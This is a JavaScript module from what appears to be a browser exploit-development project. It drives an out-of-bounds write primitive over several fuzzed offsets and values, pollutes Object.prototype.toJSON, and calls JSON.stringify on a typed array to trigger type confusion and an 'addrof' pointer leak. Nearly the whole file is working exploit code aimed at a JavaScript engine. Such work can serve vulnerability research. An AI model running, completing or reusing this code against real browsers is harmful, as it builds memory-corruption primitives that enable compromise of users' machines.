// js/script3/testArrayBufferVictimCrash.mjs (v29_OffsetAndValueFuzzing)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF = "OriginalHeisenbug_TypedArrayAddrof_v29_OffsetValueFuzz";

const VICTIM_BUFFER_SIZE = 256;
const OOB_TARGET_OFFSETS_V29 = [0x7C, 0x70, 0x68]; // Reduzido para menos iterações
const OOB_WRITE_VALUES_V29 = [0xFFFFFFFF, 0x7FFFFFFF, 0xAAAAAAAA];

let object_to_leak_A_v29 = null;
let object_to_leak_B_v29 = null;
let victim_typed_array_ref_v29 = null; 
let probe_call_count_v29 = 0;
let last_probe_details_v29 = null; 
const PROBE_CALL_LIMIT_V29 = 5; 


function toJSON_TA_Probe_OffsetValueFuzz() {
    probe_call_count_v29++;
    const call_num = probe_call_count_v29;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v29_OffsetValueFuzz",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v29),
        this_is_prev_marker: (typeof this === 'object' && this !== null && this.hasOwnProperty('marker_id_v29') && this.marker_id_v29 === `MARKER_CALL_${call_num - 1}`),
        writes_on_confused_this_attempted: false,
        confused_this_keys: null,
        error_in_probe: null
    };
    // LogS3 verboso dentro da sonda pode ser demais para um loop de fuzzing, reduzir se necessário
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsPrevMarker? ${current_call_details.this_is_prev_marker}`, "dev_verbose");

    try {
        if (call_num > PROBE_CALL_LIMIT_V29) {
            last_probe_details_v29 = current_call_details;
            return { recursion_stopped_v29: true };
        }

        if (current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION for 'this'! (IsVictim? ${current_call_details.this_is_victim}, IsPrevMarker? ${current_call_details.this_is_prev_marker})`, "vuln");
            
            if (object_to_leak_A_v29) this.leaky_A = object_to_leak_A_v29; // Usar propriedades nomeadas
            if (object_to_leak_B_v29) this.leaky_B = object_to_leak_B_v29;
            current_call_details.writes_on_confused_this_attempted = true;
            try { current_call_details.confused_this_keys = Object.keys(this); } catch(e){}
            
            last_probe_details_v29 = current_call_details;
            return this; // Retornar o 'this' confuso e modificado
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
    }
    
    last_probe_details_v29 = current_call_details;
    return { marker_id_v29: `MARKER_CALL_${call_num}` }; 
}

export async function executeTypedArrayVictimAddrofTest_OffsetValueFuzz() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (OffsetValueFuzzing) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF} Init...`;

    let overall_results = [];

    for (const oob_offset of OOB_TARGET_OFFSETS_V29) {
        for (const oob_value of OOB_WRITE_VALUES_V29) {
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${toHex(oob_offset,16)}_Val${toHex(oob_value)}`;
            logS3(`\n===== ITERATION: Offset: ${toHex(oob_offset)}, Value: ${toHex(oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

            probe_call_count_v29 = 0;
            last_probe_details_v29 = null; 
            victim_typed_array_ref_v29 = null; 
            object_to_leak_A_v29 = { marker: `ObjA_TA_v29_${toHex(oob_offset,16)}_${toHex(oob_value)}`, id: Date.now() }; 
            object_to_leak_B_v29 = { marker: `ObjB_TA_v29_${toHex(oob_offset,16)}_${toHex(oob_value)}`, id: Date.now() + 1 };

            let iterError = null;
            let stringifyOutput_parsed = null; 
            let iter_last_probe_details = null;
            
            let addrof_Victim_A = { success: false, msg: "VictimA: Default" };
            let addrof_Output_LeakyA = { success: false, msg: "Output.leaky_A: Default"};
            const fillPattern = 0.29292929292929;

            try {
                await triggerOOB_primitive({ force_reinit: true });
                oob_write_absolute(oob_offset, oob_value, 4);
                logS3(`  OOB Write: offset ${toHex(oob_offset)}, value ${toHex(oob_value)} done.`, "info", FNAME_CURRENT_ITERATION);
                await PAUSE_S3(50); // Shorter pause

                victim_typed_array_ref_v29 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
                let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v29.buffer); 
                for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
                
                const ppKey = 'toJSON';
                let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
                let pollutionApplied = false;

                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_OffsetValueFuzz, writable: true, configurable: true, enumerable: false });
                    pollutionApplied = true;
                    let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v29); 
                    try {
                        stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
                    } catch (e_parse) {
                        stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
                    }
                    if (last_probe_details_v29) { // last_probe_details_v29 is the actual object from the last probe call
                        iter_last_probe_details = JSON.parse(JSON.stringify(last_probe_details_v29)); 
                    }
                    logS3(`  Last probe details for this iter: ${iter_last_probe_details ? JSON.stringify(iter_last_probe_details) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                    let tc_on_marker = iter_last_probe_details?.this_is_prev_marker && iter_last_probe_details?.this_type === "[object Object]";
                        
                    if (float64_view_on_victim_buffer[0] !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${float64_view_on_victim_buffer[0]}`;
                    
                    if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
                        const output_val_A = stringifyOutput_parsed.leaky_A; // Check for 'leaky_A'
                        if (typeof output_val_A === 'number' && output_val_A !==0) {
                            let out_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_A]).buffer)[0], new Uint32Array(new Float64Array([output_val_A]).buffer)[1]);
                            if (out_A_int64.high() < 0x00020000 || (out_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                               addrof_Output_LeakyA.success = true; addrof_Output_LeakyA.msg = `Possible pointer for Output.leaky_A: ${out_A_int64.toString(true)}`;
                            } else { addrof_Output_LeakyA.msg = `Output.leaky_A is num but not ptr: ${output_val_A}`; }
                        } else if (output_val_A === object_to_leak_A_v29) {
                             addrof_Output_LeakyA.success = true; addrof_Output_LeakyA.msg = "object_to_leak_A_v29 identity in Output.leaky_A.";
                        } else { addrof_Output_LeakyA.msg = `Output.leaky_A not ptr. Val: ${output_val_A}`; }
                    } else { addrof_Output_LeakyA.msg = "stringifyOutput was not an object or was null."; }

                } catch (e_str) { iterError = e_str;
                } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: false }); }
            } catch (e_outer) { iterError = e_outer;
            } finally { clearOOBEnvironment(); }
            
            overall_results.push({
                offset: toHex(oob_offset), value: toHex(oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
                probe_details: iter_last_probe_details, stringify_output: stringifyOutput_parsed,
                addrof_victim_A: {...addrof_Victim_A}, addrof_output_leaky_A: {...addrof_Output_LeakyA}
            });
            if (addrof_Output_LeakyA.success) {
                logS3(`!!!! POTENTIAL ADDROF SUCCESS at offset ${toHex(oob_offset)} val ${toHex(oob_value)} !!!!`, "vuln", FNAME_CURRENT_ITERATION);
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF}: Addr? ${toHex(oob_offset)}/${toHex(oob_value)} SUCCESS!`;
            }
            await PAUSE_S3(100); 
        }
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    overall_results.forEach(res => {
        logS3(`Off: ${res.offset}, Val: ${res.value}: AddrLeak Success=${res.addrof_output_leaky_A.success}. Last Probe 'this' type: ${res.probe_details?.this_type || 'N/A'}. Err: ${res.error || 'None'}`, 
              res.addrof_output_leaky_A.success ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
    });
    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF}: All Fuzz Tested.`;
    
    return { overall_results: overall_results };
}
